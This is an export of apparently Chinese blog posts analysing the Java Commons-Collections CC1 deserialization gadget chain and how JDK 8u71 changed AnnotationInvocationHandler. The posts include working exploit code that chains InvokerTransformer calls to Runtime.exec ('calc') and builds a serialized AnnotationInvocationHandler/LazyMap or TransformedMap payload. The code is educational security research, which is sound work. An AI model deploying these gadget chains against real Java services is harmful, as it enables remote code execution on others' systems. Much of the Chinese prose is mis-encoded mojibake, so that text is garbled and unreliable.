class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chuan2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">Transformer chuan3= <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">Transformer[] chuan = &#123;chaun0,chuan1,chuan2,chuan3,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">con</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;con&#125;);</span><br><span class="line"></span><br><span class="line">Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,lazyMap);</span><br><span class="line"><span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,h);</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj2</span> <span class="operator">=</span> constructor.newInstance(Override.class,mapProxy);</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> chainedTransformer.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">f.set(chainedTransformer,chuan);</span><br><span class="line"></span><br><span class="line">serialize(obj2);</span><br><span class="line">unserialize();</span><br></pre></td></tr></table></figure><h3 id="4-JDK8u71"><a href="#4-JDK8u71" class="headerlink" title="4.JDK8u71"></a>4.JDK8u71</h3><p>åœ¨ <strong>JDK 8u71</strong> è¿™ä¸ªç‰ˆæœ¬ä¸­ï¼ŒOracle ä¿®æ”¹äº† <code>AnnotationInvocationHandler</code> çš„æºç </p><p>Oracle åœ¨ 8u71ï¼ˆä»¥åŠ 7u95, 6u111ï¼‰ä¸­é‡å†™äº† <code>readObject</code> æ–¹æ³•ã€‚åŸæœ¬æ˜¯ä¸ºäº†è§£å†³å¦ä¸€ä¸ªæ— å…³çš„ bugï¼Œä½†å‰¯ä½œç”¨æ˜¯å½»åº•æ”¹å˜äº†æ•°æ®çš„è¯»å–æ–¹å¼ï¼Œå¤§æ¦‚å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JDK &gt;= 8u71</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// 1. æ”¹ç”¨ GetField è¯»å–ï¼Œä¸å†è‡ªåŠ¨æ¢å¤å¯¹è±¡å±æ€§</span></span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. ä»æµä¸­è·å–å€¼ï¼Œèµ‹ç»™å±€éƒ¨å˜é‡ streamValï¼Œè€Œä¸æ˜¯ç›´æ¥èµ‹ç»™ this.memberValues</span></span><br><span class="line">    <span class="comment">// æ³¨æ„ï¼šæ­¤æ—¶ this.memberValues ä»ç„¶æ˜¯ nullï¼</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    Map&lt;String, Object&gt; streamVal = (Map&lt;String, Object&gt;)fields.get(<span class="string">&quot;memberValues&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">    Class&lt;?&gt; streamType = (Class&lt;?&gt;)fields.get(<span class="string">&quot;type&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(streamType);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// å¦‚æœç±»å‹ä¸å¯¹ï¼Œç›´æ¥ returnï¼Œæ ¹æœ¬ä¸å¾€ä¸‹èµ°</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. è¿™é‡Œçš„é€»è¾‘å®Œå…¨å˜äº†ï¼</span></span><br><span class="line">    <span class="comment">// ä»¥å‰æ˜¯ç›´æ¥éå† memberValues (ä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„ Proxy)</span></span><br><span class="line">    <span class="comment">// ç°åœ¨å®ƒæ–°å»ºäº†ä¸€ä¸ª LinkedHashMap</span></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line">    Map&lt;String, Object&gt; mv = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;(streamVal.size());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. å®ƒå¼€å§‹éå† streamVal (è™½ç„¶ä¹Ÿæ˜¯æˆ‘ä»¬çš„ Proxy)</span></span><br><span class="line">    <span class="comment">// ä½†æ˜¯ï¼æ³¨æ„çœ‹å®ƒæ€ä¹ˆæ“ä½œçš„</span></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : streamVal.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">        <span class="comment">// ... çœç•¥ä¸€ç³»åˆ—ç±»å‹æ£€æŸ¥ ...</span></span><br><span class="line">        mv.put(name, value); <span class="comment">// åªæ˜¯æŠŠå€¼å–å‡ºæ¥æ”¾åˆ°æ–° Map é‡Œ</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. æœ€åæ‰æŠŠæ–°ç”Ÿæˆçš„ã€å¹²å‡€çš„ Map èµ‹ç»™ this.memberValues</span></span><br><span class="line">    <span class="built_in">this</span>.memberValues = mv; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><strong>LazyMap</strong></p><p>è¿™ä¸ªä¸èƒ½ç”¨çš„åŸå› æ˜¯å› ä¸º</p><p><code>jdk8u71</code>é‡å†™äº†<code>AnnotationInvocationHandler</code>çš„<code>readObject</code>æ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601121615057.png" alt="image-20260112161554788"></p><p><strong>è¿™é‡Œæˆ‘ä»¬ä¼ å…¥çš„ LazyMapProxy ä¸åœ¨æ˜¯é€šè¿‡é»˜è®¤çš„defaultreadfieldæ–¹æ³•å»æ„å»ºï¼Œè€Œæ˜¯é€šè¿‡è‡ªå®šä¹‰æµçš„æƒ…å†µä¸‹è·å–æˆ‘ä»¬ä¼ å…¥çš„æ¶æ„ç±» LazyMapProxy å¹¶èµ‹å€¼ä¸º streamVals ï¼Œä¹‹åè°ƒç”¨entrySetæ–¹æ³•ï¼Œè¿›åˆ°äº†æˆ‘ä»¬é‡å†™çš„ invoke æ–¹æ³•</strong></p><ul><li><p><strong>å¯èƒ½æ€§1</strong></p><p>æ­¤æ—¶ï¼ŒreadObjecté€»è¾‘æ²¡æœ‰æ‰§è¡Œå®Œï¼Œ memberValues è¿™ä¸ªæˆå‘˜å˜é‡å½“ç„¶ä¹Ÿè¿˜æ²¡æœ‰èµ‹å€¼ï¼Œæ‰€ä»¥ä¼šäº§ç”Ÿç©ºæŒ‡é’ˆå¼‚å¸¸ï¼Œçˆ†ç‚¸</p></li><li><p><strong>å¯èƒ½æ€§2ï¼ˆæ›´åŠ ç¨³å¦¥ï¼‰</strong></p><p><strong>ä½†æ˜¯æ­¤æ—¶ï¼Œæˆ‘ä»¬åˆ›å»ºä»£ç†å¯¹è±¡æ¶æ„ç±»çš„æ—¶å€™</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,lazyMap);</span><br></pre></td></tr></table></figure><p><strong>è¿™ä¸ªï¼Œæ–°ç‰ˆæœ¬é‡å†™äº† readobject é€»è¾‘ï¼Œå¯¼è‡´æœ€åæŠŠæ–°ç”Ÿæˆçš„ã€å¹²å‡€çš„ Map èµ‹ç»™ this.memberValuesï¼Œè€Œä¸æ˜¯æˆ‘ä»¬æœ€å¼€å§‹çš„æ¶æ„ä»£ç†ç±»LazyMapProxy</strong></p><p><strong>è¿›è€Œåœ¨ invoke é‡Œè°ƒç”¨putæ–¹æ³•æ—¶ï¼Œä¸ä¼šè§¦å‘æˆ‘ä»¬çš„æ¶æ„æ–¹æ³•é“¾</strong></p><p>æ–°ç‰ˆä»£ç å¤„ç†åï¼Œ<code>AnnotationInvocationHandler</code> å¯¹è±¡åœ¨å†…å­˜é‡Œå¤æ´»æ—¶ï¼Œå®ƒçš„ <code>memberValues</code> å˜æˆäº†ä¸€ä¸ªæ™®é€šçš„ <code>LinkedHashMap</code></p></li></ul></li><li><p><strong>TransformerMap</strong></p><p><strong>è¿™ä¸ªå°±æ›´åˆ«è¯´äº†ï¼Œæ–°ç‰ˆæœ¬ç›´æ¥åˆ é™¤äº†è¿™ä¸ªç±»çš„è§¦å‘æ–¹æ³• setValue</strong></p><p><strong>jdk8u71</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601121651757.png" alt="image-20260112165125225"></p><p><strong>jdk8u65</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601121657110.png" alt="image-20260112165700052"></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> CCé“¾ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javaå®‰å…¨ </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> CCé“¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaå®‰å…¨-CC1</title>
      <link href="/2026/01/06/CC1-Chain/"/>
      <url>/2026/01/06/CC1-Chain/</url>
      
        <content type="html"><![CDATA[<h1 id="Javaå®‰å…¨-CC1"><a href="#Javaå®‰å…¨-CC1" class="headerlink" title="Javaå®‰å…¨-CC1"></a>Javaå®‰å…¨-CC1</h1><p><strong>ç¯å¢ƒæ­å»º</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">oracle_jdk8u65</span><br><span class="line">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</span><br><span class="line"></span><br><span class="line">open_jdk8u65</span><br><span class="line">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4</span><br><span class="line"></span><br><span class="line">maven_3.6.3</span><br><span class="line">https://archive.apache.org/dist/maven/maven-3/3.6.3/binaries/</span><br><span class="line">æ•™ç¨‹:https://blog.csdn.net/MSDCP/article/details/127680844</span><br><span class="line"></span><br><span class="line">commons-collections3.2.1</span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;commons-collections&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;3.2.1&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p><strong>å°† openjdk ä¸­çš„ sun åŒ…æ‹·è´åˆ° Oracle_jdk ç›®å½•ä¸‹ src åŒ…ä¸­å®ç°åœ¨è°ƒè¯•çš„è¿‡ç¨‹ä¸­æŸ¥çœ‹æºç ï¼Œmavençš„æºç ç‚¹å‡»ä¸‹è½½å°±å¥½</strong></p><p>è¿™ä¸ªé“¾ä¸»è¦åˆ©ç”¨çš„æ˜¯<code>org/apache/commons/collections/Transformer.java</code>æ¥å£æ‰€å®ç°çš„ç±»</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601072053019.png" alt="image-20260107205318956"></p><p><strong>å®ƒå…¶ä¸­åªæœ‰ä¸€ä¸ªé‡è¦çš„æ–¹æ³•éœ€è¦é‡å†™ï¼Œ<code>transform</code>æ–¹æ³•</strong></p><h2 id="ä¸€ã€ä¸»è¦é“¾é€»è¾‘"><a href="#ä¸€ã€ä¸»è¦é“¾é€»è¾‘" class="headerlink" title="ä¸€ã€ä¸»è¦é“¾é€»è¾‘"></a>ä¸€ã€ä¸»è¦é“¾é€»è¾‘</h2><h3 id="1-å±é™©æ–¹æ³•è°ƒç”¨"><a href="#1-å±é™©æ–¹æ³•è°ƒç”¨" class="headerlink" title="1.å±é™©æ–¹æ³•è°ƒç”¨"></a>1.å±é™©æ–¹æ³•è°ƒç”¨</h3><p><code>Transformer</code>æ¥å£çš„å®ç°ç±»<code>ChainedTransformer</code>é‡å†™çš„<code>Transform</code>æ–¹æ³•</p><ul><li><strong><a href="#2chainedtransformer%E7%B1%BB">è·³åˆ°ChainedTransformeré“¾</a></strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chuan1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chuan2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">Transformer chuan3= <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">Transformer[] chuan = &#123;chuan1,chuan2,chuan3&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(chuan).transform(r);</span><br></pre></td></tr></table></figure><p><strong>è¯¥ç±»è°ƒç”¨transformæ–¹æ³•ä¼šè§¦å‘å‘½ä»¤æ‰§è¡Œ</strong></p><h3 id="2-é“¾æ¥"><a href="#2-é“¾æ¥" class="headerlink" title="2.é“¾æ¥"></a>2.é“¾æ¥</h3><ul><li><strong>å¯»æ‰¾å¤–éƒ¨ç±»ä¸­è°ƒç”¨<code>transform</code>æ–¹æ³•çš„ç±»</strong></li></ul><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601081055260.png" alt="image-20260108105540127"></p><p>è¿™é‡Œä¸»è¦ç”¨åˆ°äº†<code>TransformedMap</code>è¿™ä¸ªç±»</p><p><strong>å†…éƒ¨çš„è°ƒç”¨é€»è¾‘ä¸»è¦ä¸ºä¸‹é¢å‡ ä¸ªæ–¹æ³•</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">org/apache/commons/collections/map/TransformedMap.java</span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(value); <span class="number">1.</span>è°ƒç”¨transform</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">-&gt;</span><br><span class="line">org/apache/commons/collections/map/AbstractInputCheckedMapDecorator.java</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    </span><br><span class="line">    value = parent.checkSetValue(value);  <span class="number">2.</span>è°ƒç”¨chexkSetValue</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">&#125;</span><br><span class="line">-&gt;</span><br></pre></td></tr></table></figure><p>ç›®å‰è¿½è¸ªåˆ°<code>setValue</code>æ–¹æ³•ï¼Œè€Œè¿™ä¸ªæ–¹æ³•çš„ç›®çš„æ˜¯</p><ul><li><strong>æ‹¦æˆªâ€œé€šè¿‡ Map.Entry ç›´æ¥æ”¹å€¼â€çš„è¡Œä¸ºï¼Œè®©å®ƒä¹Ÿå¿…é¡»å…ˆç»è¿‡çˆ¶ Map çš„æ ¡éªŒ&#x2F;è½¬æ¢ï¼Œå†çœŸæ­£å†™è¿›å»ã€‚</strong></li></ul><p>å…¶å®ï¼Œè¿™ä¸ª<code>setValue</code>æ–¹æ³•æœ¬è´¨ä¹Ÿå°±æ˜¯Mapé›†åˆä¸­Entryå¯¹è±¡çš„ä¸€ä¸ª<code>setValue</code>æ–¹æ³•çš„é‡å†™</p><p>æ‰€ä»¥æˆ‘ä»¬åœ¨éå†ä¸€ä¸ªè¢«<code>ChainedTransformer(chuan)</code>ä¿®é¥°çš„é›†åˆè·å–åˆ°<code>Entry</code>æ—¶ï¼Œä¾¿å¯ä»¥è°ƒç”¨<code>setValue</code>æ–¹æ³•</p><p><strong>åˆšå¥½ï¼Œ1ä¸­valueTransformerè¿™ä¸ªç±»å¯ä»¥åœ¨ä¿æŠ¤æ„é€ å™¨ä¸­ä¼ å‚æ§åˆ¶</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601081147547.png" alt="image-20260108114737427"></p><p>è€Œä¸‹é¢è¿™ä¸ª<code>decorate</code>æ–¹æ³•åˆšå¥½æ˜¯å…¬å¼€çš„å¹¶ä¸”è¿”å›ä¸€ä¸ª<code>TransformedMap</code></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601081149953.png" alt="image-20260108114933918"></p><p><strong>åˆ©ç”¨</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;yy&quot;</span>, <span class="string">&quot;yy&quot;</span>);</span><br><span class="line">Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(chuan));</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(Map.Entry&lt;Object,Object&gt; entry : transformedMap.entrySet())&#123;</span><br><span class="line">    entry.setValue(r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601081143444.png" alt="image-20260108114311263"></p><h3 id="3-å¯»æ‰¾å…¥å£"><a href="#3-å¯»æ‰¾å…¥å£" class="headerlink" title="3.å¯»æ‰¾å…¥å£"></a>3.å¯»æ‰¾å…¥å£</h3><p>æˆ‘ä»¬ç°åœ¨å·²ç»å®ç°äº†ï¼Œ<strong>é€šè¿‡ä¸€ä¸ªéå†æ•°ç»„ï¼Œè·å–åˆ°Entryå¯¹è±¡</strong>ï¼Œæˆ‘ä»¬æœ€ååªéœ€è¦<strong>æœ‰ä¸€ä¸ªååºåˆ—åŒ–ç±»ï¼Œè¿™ä¸ªç±»çš„readObjectæ–¹æ³•ä¼šéå†æ•°ç»„è°ƒç”¨setValueæ–¹æ³•</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601081207318.png" alt="image-20260108120720150"></p><p><strong>å°±æ˜¯å®ƒï¼ï¼çœ‹åˆ°</strong><code>sun/reflect/annotation/AnnotationInvocationHandler.java</code><strong>è¿™ä¸ªç±»ä¸­é‡å†™çš„ readObject æ–¹æ³•è°ƒç”¨äº† setValue æ–¹æ³•</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">    <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">              </span><br><span class="line">                </span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                   </span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                        value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                        annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å°è¯•æ„é€ è¿™ä¸ªç±»å¹¶ä¸”è¿›è¡Œååºåˆ—åŒ–</strong></p><p>æ„é€ æ–¹æ³•å…·ä½“ä»£ç å¦‚ä¸‹</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601081221425.png" alt="image-20260108122154371"></p><p><strong>è¿™ä¸ªç±»å‚æ•°ä¸ºä¸€ä¸ªæ³¨è§£å’Œä¸€ä¸ªMapé›†åˆï¼Œåˆšå¥½å¯ä»¥å°†æˆ‘ä»¬è£…é¥°çš„ transformedMap ä¼ é€’ï¼Œä½†è¿™ä¸ªæ„é€ æ–¹æ³•æ˜¯defaultçš„ï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡åå°„å»è·å–å¹¶ä¸”å®ä¾‹åŒ–ï¼Œå¦‚ä¸‹</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Override.class, transformedMap);</span><br></pre></td></tr></table></figure><p><strong>ä½†æ˜¯ä¾æ—§æœ‰ä¸€äº›æ¡ä»¶éœ€è¦æ»¡è¶³</strong></p><ol><li><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601081241754.png" alt="image-20260108124159578"></p><p><strong>è¿™ä¸ªæ•´ä½“éœ€è¦æ»¡è¶³ç¡®è®¤æ³¨è§£å­˜åœ¨</strong></p><p><code>memberTypes = annotationType.memberTypes();</code>ï¼Œä»–æ˜¯ç”±<code>annotationType = AnnotationType.getInstance(type);</code>è·å–çš„ï¼Œ<code>AnnotationType.getInstance(type)</code> çš„ä½œç”¨ä¸€å¥è¯æ¦‚æ‹¬ï¼š</p><blockquote><p><strong>ç»™æŸä¸ªâ€œæ³¨è§£æ¥å£ Classâ€ï¼ˆæ¯”å¦‚ <code>Target.class</code>ï¼‰åˆ›å»º&#x2F;è·å–ä¸€ä»½â€œè¿è¡ŒæœŸæ³¨è§£å…ƒæ•°æ®ç¼“å­˜â€</strong>ï¼Œé‡Œé¢åŒ…å«è¿™ä¸ªæ³¨è§£æœ‰å“ªäº›æˆå‘˜ã€æ¯ä¸ªæˆå‘˜åº”è¯¥æ˜¯ä»€ä¹ˆè¿”å›ç±»å‹ã€é»˜è®¤å€¼æ˜¯ä»€ä¹ˆã€Retention&#x2F;Inherited æ˜¯ä»€ä¹ˆï¼Œç”¨æ¥ <strong>æ ¡éªŒååºåˆ—åŒ–å‡ºæ¥çš„æ³¨è§£å€¼</strong>ã€ä»¥åŠ 